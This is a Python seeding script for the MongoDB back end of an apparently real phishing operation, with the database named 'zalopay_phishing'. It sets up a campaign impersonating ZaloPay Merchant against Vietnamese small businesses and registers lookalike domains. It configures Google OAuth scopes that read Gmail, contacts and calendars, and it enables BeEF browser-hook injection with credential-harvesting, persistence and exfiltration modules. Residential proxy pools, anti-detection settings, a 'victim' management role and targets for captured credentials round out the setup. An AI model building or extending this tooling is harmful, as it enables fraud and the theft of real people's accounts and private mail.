"""
Production Data Seeding Script
Creates default admin user, sample campaign, and system configurations
"""

import logging
import os
import sys
from datetime import datetime, timezone, timedelta
from pymongo import MongoClient
from pymongo.errors import PyMongoError
from passlib.context import CryptContext

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configure password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

class ProductionDataSeeder:
    """Production data seeding manager"""

    def __init__(self, connection_string: str, database_name: str):
        self.connection_string = connection_string
        self.database_name = database_name
        self.client = None
        self.db = None

    def connect(self) -> bool:
        """Connect to MongoDB"""
        try:
            self.client = MongoClient(
                self.connection_string,
                serverSelectionTimeoutMS=5000,
                maxPoolSize=10,
                minPoolSize=2
            )

            # Test connection
            self.client.admin.command('ping')
            self.db = self.client[self.database_name]

            logger.info("Connected to MongoDB: %s", self.database_name)
            return True

        except PyMongoError as e:
            logger.error("MongoDB connection failed: %s", e)
            return False

    def create_super_admin_user(self) -> bool:
        """Create super admin user"""
        try:
            admin_collection = self.db.admin_users

            # Check if admin user already exists
            existing_admin = admin_collection.find_one({"username": "admin"})
            if existing_admin:
                logger.info("Super admin user already exists")
                return True

            # Hash password
            password = "Admin@2025"
            password_hash = pwd_context.hash(password)

            # Create super admin user document
            admin_user = {
                "username": "admin",
                "email": "admin@zalopaymerchan.com",
                "password_hash": password_hash,
                "role": "super_admin",
                "permissions": [
                    "dashboard_view",
                    "victim_management",
                    "victim_create",
                    "victim_update",
                    "victim_delete",
                    "victim_export",
                    "gmail_exploitation",
                    "gmail_access",
                    "gmail_export",
                    "beef_control",
                    "beef_commands",
                    "beef_sessions",
                    "campaign_management",
                    "campaign_create",
                    "campaign_update",
                    "campaign_delete",
                    "data_export",
                    "system_monitoring",
                    "admin_management",
                    "admin_create",
                    "admin_update",
                    "admin_delete",
                    "activity_logs",
                    "system_configuration"
                ],
                "access_restrictions": {
                    "ip_whitelist": ["0.0.0.0/0"],  # Allow from anywhere for initial setup
                    "time_restrictions": {
                        "allowed_hours": list(range(0, 24)),  # 24/7 access
                        "timezone": "Asia/Ho_Chi_Minh"
                    },
                    "data_access_level": "all"
                },
                "mfa_config": {
                    "mfa_enabled": False,
                    "mfa_method": "totp",
                    "totp_secret": None,
                    "backup_codes": [],
                    "last_mfa_reset": None
                },
                "session_config": {
                    "max_concurrent_sessions": 10,
                    "session_timeout_minutes": 120,
                    "idle_timeout_minutes": 30,
                    "require_fresh_auth_for_sensitive": True
                },
                "activity_summary": {
                    "last_login": None,
                    "last_activity": None,
                    "login_count_30d": 0,
                    "failed_login_attempts_24h": 0,
                    "victims_accessed_30d": 0,
                    "gmail_exploitations_30d": 0,
                    "data_exports_30d": 0
                },
                "security_flags": {
                    "account_locked": False,
                    "password_expired": False,
                    "suspicious_activity": False,
                    "last_password_change": datetime.now(timezone.utc),
                    "password_change_required": False
                },
                "admin_metadata": {
                    "created_by": None,
                    "department": "System Administration",
                    "clearance_level": "maximum",
                    "training_completed": [
                        "opsec_fundamentals",
                        "gmail_exploitation",
                        "beef_framework",
                        "legal_compliance",
                        "system_administration"
                    ]
                },
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "is_active": True
            }

            # Insert admin user
            result = admin_collection.insert_one(admin_user)
            logger.info("Created super admin user with ID: %s", result.inserted_id)
            logger.info("Admin credentials: username=admin, password=Admin@2025")

            return True

        except PyMongoError as e:
            logger.error("Error creating super admin user: %s", e)
            return False

    def create_sample_campaign(self) -> bool:
        """Create a sample campaign for testing"""
        try:
            campaigns_collection = self.db.campaigns

            # Check if sample campaign already exists
            existing_campaign = campaigns_collection.find_one({"code": "ZPM_Q4_2025_VN_SME"})
            if existing_campaign:
                logger.info("Sample campaign already exists")
                return True

            # Create sample campaign
            sample_campaign = {
                "name": "ZaloPay Merchant Q4 2025 - Vietnamese SME",
                "code": "ZPM_Q4_2025_VN_SME",
                "description": ("Targeting Vietnamese small-medium enterprises với "
                               "ZaloPay Merchant registration theme"),
                "config": {
                    "target_domains": [
                        "zalopaymerchan.com",
                        "zalopay-business.net",
                        "merchant.zalopay.vn"
                    ],
                    "landing_template": "zalopay_merchant_v2_vietnamese",
                    "authentication_methods": ["google_oauth", "apple_oauth", "manual_form"],
                    "geographic_targeting": {
                        "primary_countries": ["VN"],
                        "secondary_countries": ["TH", "MY", "SG"],
                        "exclude_countries": ["US", "EU", "AU"]
                    },
                    "demographic_targeting": {
                        "target_languages": ["vi", "vi-VN"],
                        "business_focus": True,
                        "executive_targeting": True,
                        "tech_savvy_level": "medium"
                    }
                },
                "infrastructure": {
                    "proxy_pool": "vietnam_residential_premium",
                    "beef_enabled": True,
                    "anti_detection_level": "high",
                    "load_balancing": "round_robin",
                    "backup_domains": [
                        "zalopay-registration.com",
                        "merchant-zalopay.net"
                    ]
                },
                "timeline": {
                    "planned_start": datetime.now(timezone.utc),
                    "actual_start": None,
                    "planned_end": datetime(2025, 12, 31, 23, 59, 59, tzinfo=timezone.utc),
                    "current_phase": "planning",
                    "milestones": [
                        {
                            "name": "Infrastructure Setup",
                            "target_date": datetime.now(timezone.utc) + timedelta(days=7),
                            "completed": False
                        },
                        {
                            "name": "Landing Page Deployment",
                            "target_date": datetime.now(timezone.utc) + timedelta(days=14),
                            "completed": False
                        },
                        {
                            "name": "OAuth Integration",
                            "target_date": datetime.now(timezone.utc) + timedelta(days=21),
                            "completed": False
                        },
                        {
                            "name": "BeEF Integration",
                            "target_date": datetime.now(timezone.utc) + timedelta(days=28),
                            "completed": False
                        }
                    ]
                },
                "statistics": {
                    "total_visits": 0,
                    "unique_visitors": 0,
                    "credential_captures": 0,
                    "successful_validations": 0,
                    "high_value_targets": 0,
                    "business_accounts": 0,
                    "conversion_rates": {
                        "visit_to_interaction": 0.0,
                        "interaction_to_auth_attempt": 0.0,
                        "auth_attempt_to_capture": 0.0,
                        "capture_to_validation": 0.0,
                        "overall_conversion": 0.0
                    },
                    "performance_metrics": {
                        "average_session_duration_seconds": 0,
                        "bounce_rate": 0.0,
                        "pages_per_session": 0.0,
                        "load_time_average_ms": 0,
                        "proxy_success_rate": 0.0
                    },
                    "geographic_distribution": {},
                    "hourly_performance": {
                        "peak_hours": [],
                        "best_conversion_hours": [],
                        "worst_performance_hours": []
                    }
                },
                "success_criteria": {
                    "target_captures": 1000,
                    "target_validations": 700,
                    "target_high_value": 100,
                    "min_success_rate": 0.20,
                    "max_detection_incidents": 5
                },
                "risk_assessment": {
                    "current_risk_level": "low",
                    "detection_incidents": 0,
                    "law_enforcement_interest": "none",
                    "technical_countermeasures": 0,
                    "mitigation_actions": []
                },
                "team": {
                    "campaign_manager": None,
                    "technical_lead": None,
                    "analysts": [],
                    "operators": []
                },
                "status": "draft",
                "status_history": [
                    {
                        "status": "draft",
                        "timestamp": datetime.now(timezone.utc),
                        "changed_by": None,
                        "reason": "Sample campaign created during initialization"
                    }
                ],
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "created_by": None
            }

            # Insert sample campaign
            result = campaigns_collection.insert_one(sample_campaign)
            logger.info("Created sample campaign with ID: %s", result.inserted_id)

            return True

        except PyMongoError as e:
            logger.error("Error creating sample campaign: %s", e)
            return False

    def create_system_configurations(self) -> bool:
        """Create system configuration documents"""
        try:
            # Create system configurations collection if it doesn't exist
            if "system_configs" not in self.db.list_collection_names():
                self.db.create_collection("system_configs")

            configs_collection = self.db.system_configs

            # Check if configurations already exist
            existing_configs = configs_collection.count_documents({})
            if existing_configs > 0:
                logger.info("System configurations already exist")
                return True

            # System configurations
            configurations = [
                {
                    "config_type": "oauth_settings",
                    "config_data": {
                        "google_oauth": {
                            "enabled": True,
                            "client_id": "380849263283-ocv9ulqk3nfqcmllthjo61pb9lvri99e.apps.googleusercontent.com",
                            "scopes": [
                                "openid",
                                "email",
                                "profile",
                                "https://www.googleapis.com/auth/gmail.readonly",
                                "https://www.googleapis.com/auth/contacts.readonly",
                                "https://www.googleapis.com/auth/calendar.readonly"
                            ]
                        },
                        "apple_oauth": {
                            "enabled": False,
                            "client_id": None,
                            "scopes": ["name", "email"]
                        },
                        "facebook_oauth": {
                            "enabled": False,
                            "client_id": None,
                            "scopes": ["email", "public_profile"]
                        }
                    },
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                },
                {
                    "config_type": "beef_settings",
                    "config_data": {
                        "beef_enabled": True,
                        "beef_url": "http://beef:3000",
                        "hook_injection": {
                            "enabled": True,
                            "injection_points": ["auth_success", "merchant_dashboard"],
                            "stealth_mode": True
                        },
                        "command_modules": {
                            "reconnaissance": True,
                            "credential_harvesting": True,
                            "social_engineering": True,
                            "persistence": True,
                            "data_exfiltration": True
                        }
                    },
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                },
                {
                    "config_type": "security_settings",
                    "config_data": {
                        "rate_limiting": {
                            "api_requests_per_minute": 100,
                            "login_attempts_per_minute": 5,
                            "beef_requests_per_minute": 2
                        },
                        "session_security": {
                            "session_timeout_minutes": 120,
                            "idle_timeout_minutes": 30,
                            "max_concurrent_sessions": 5
                        },
                        "encryption": {
                            "algorithm": "AES-256-GCM",
                            "key_rotation_days": 90
                        }
                    },
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                },
                {
                    "config_type": "monitoring_settings",
                    "config_data": {
                        "metrics_collection": {
                            "enabled": True,
                            "interval_seconds": 60,
                            "retention_days": 30
                        },
                        "alerting": {
                            "enabled": True,
                            "high_value_target_threshold": 0.8,
                            "detection_incident_threshold": 3
                        },
                        "logging": {
                            "level": "INFO",
                            "retention_days": 30,
                            "structured_format": True
                        }
                    },
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                }
            ]

            # Insert configurations
            result = configs_collection.insert_many(configurations)
            logger.info("Created %d system configurations", len(result.inserted_ids))

            return True

        except PyMongoError as e:
            logger.error("Error creating system configurations: %s", e)
            return False

    def create_default_proxy_pools(self) -> bool:
        """Create default proxy pool configurations"""
        try:
            # Create proxy pools collection if it doesn't exist
            if "proxy_pools" not in self.db.list_collection_names():
                self.db.create_collection("proxy_pools")

            proxy_pools_collection = self.db.proxy_pools

            # Check if proxy pools already exist
            existing_pools = proxy_pools_collection.count_documents({})
            if existing_pools > 0:
                logger.info("Proxy pools already exist")
                return True

            # Default proxy pools
            proxy_pools = [
                {
                    "pool_name": "vietnam_residential_premium",
                    "pool_type": "residential",
                    "country": "VN",
                    "proxies": [
                        {
                            "proxy_id": "vn_res_001",
                            "host": "proxy1.vietnam-residential.com",
                            "port": 1080,
                            "username": "user001",
                            "password": "pass001",
                            "status": "active",
                            "last_health_check": datetime.now(timezone.utc),
                            "success_rate": 0.95
                        },
                        {
                            "proxy_id": "vn_res_002",
                            "host": "proxy2.vietnam-residential.com",
                            "port": 1080,
                            "username": "user002",
                            "password": "pass002",
                            "status": "active",
                            "last_health_check": datetime.now(timezone.utc),
                            "success_rate": 0.92
                        }
                    ],
                    "health_check_interval": 300,  # 5 minutes
                    "max_failures": 3,
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                },
                {
                    "pool_name": "mobile_vietnam",
                    "pool_type": "mobile",
                    "country": "VN",
                    "proxies": [
                        {
                            "proxy_id": "vn_mob_001",
                            "host": "mobile1.vietnam-mobile.com",
                            "port": 1080,
                            "username": "mob001",
                            "password": "mobpass001",
                            "status": "active",
                            "last_health_check": datetime.now(timezone.utc),
                            "success_rate": 0.88
                        }
                    ],
                    "health_check_interval": 300,
                    "max_failures": 3,
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                },
                {
                    "pool_name": "datacenter_global",
                    "pool_type": "datacenter",
                    "country": "GLOBAL",
                    "proxies": [
                        {
                            "proxy_id": "dc_global_001",
                            "host": "datacenter1.global-proxy.com",
                            "port": 1080,
                            "username": "dc001",
                            "password": "dcpass001",
                            "status": "active",
                            "last_health_check": datetime.now(timezone.utc),
                            "success_rate": 0.98
                        }
                    ],
                    "health_check_interval": 300,
                    "max_failures": 3,
                    "created_at": datetime.now(timezone.utc),
                    "updated_at": datetime.now(timezone.utc)
                }
            ]

            # Insert proxy pools
            result = proxy_pools_collection.insert_many(proxy_pools)
            logger.info("Created %d proxy pools", len(result.inserted_ids))

            return True

        except PyMongoError as e:
            logger.error("Error creating proxy pools: %s", e)
            return False

    def seed_all_data(self) -> bool:
        """Seed all production data"""
        try:
            logger.info("Starting production data seeding...")

            # Connect to MongoDB
            if not self.connect():
                return False

            # Create super admin user
            if not self.create_super_admin_user():
                return False

            # Create sample campaign
            if not self.create_sample_campaign():
                return False

            # Create system configurations
            if not self.create_system_configurations():
                return False

            # Create default proxy pools
            if not self.create_default_proxy_pools():
                return False

            logger.info("Production data seeding completed successfully")
            return True

        except Exception as e:
            logger.error("Production data seeding failed: %s", e)
            return False
        finally:
            if self.client:
                self.client.close()

def main():
    """Main execution function"""
    # Get connection details from environment
    mongodb_connection_uri = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
    database_name = os.getenv("MONGODB_DATABASE", "zalopay_phishing")

    # Initialize data seeder
    seeder = ProductionDataSeeder(mongodb_connection_uri, database_name)
    
    # Execute seeding
    success = seeder.seed_all_data()
    
    if success:
        print("Production data seeding completed successfully")
        print("Admin credentials: username=admin, password=Admin@2025")
        sys.exit(0)
    else:
        print("Production data seeding failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
